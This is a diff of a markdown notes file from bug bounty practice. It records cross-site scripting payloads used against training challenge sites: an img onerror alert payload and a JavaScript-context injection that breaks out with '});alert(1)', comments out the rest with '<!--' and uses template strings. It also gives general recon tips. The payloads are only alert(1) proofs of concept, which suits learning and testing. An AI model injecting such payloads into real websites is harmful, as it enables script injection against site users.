@@ -8,16 +8,17 @@
   - `https://www.bugbountytraining.com/challenges/challenge-10.php?message=#%3Cimg%20src%3Ddumm%20onerror%3Dalert(%22xss%22)%3E`
 - The obstacle was to made the JavaScript code execute without error (the browser stops script execution on the first error).
   - ``http://try.harisec.com/chals/qli/?q=testing\&format=});alert(1);a=function(){`;%3C!--``
-  - ```
-  <script type="text/javascript">
-    function init() {
-      $(document).ready(function () {
-        logTrackingData({searchType:"simple",query:"testing\",format:"});alert(1);a=function(){`;&lt;!--",pageId:"12345",pageNo:"1",searchCategory:"210",suggestions:"",results:""});
-      })
-    }
-  </script>
-    ```
-  - The value of the q parameter was properly encoded. The only exception was the forward slash character that was not encoded/escaped.
+  - The trick here was to use an unusual way to comment the JavaScript code until the end of line (`<!--`) as the usual sequence `//` was also encoded.
+  - The last trick was to use ES6 template strings ``(`)`` to be able to combine two reflections and finally exploit the injection.
+```
+      <script type="text/javascript">
+        function init() {
+          $(document).ready(function () {
+            logTrackingData({searchType:"simple",query:"testing\",format:"});alert(1);a=function(){`;&lt;!--",pageId:"12345",pageNo:"1",searchCategory:"210",suggestions:"",results:""});
+          })
+        }
+      </script>
+```
 - If you open the url in the browser and see nothing but blank page, do not assume there is nothing there.
   - ALWAYS check the source code. There might be a bunch of JavaScript or e.g. some commented source code from server.
 - ALWAYS check the full response on any request. Errors can sometimes give u the keys to the kingdom if u actually figure out what ur looking at witin the error response.
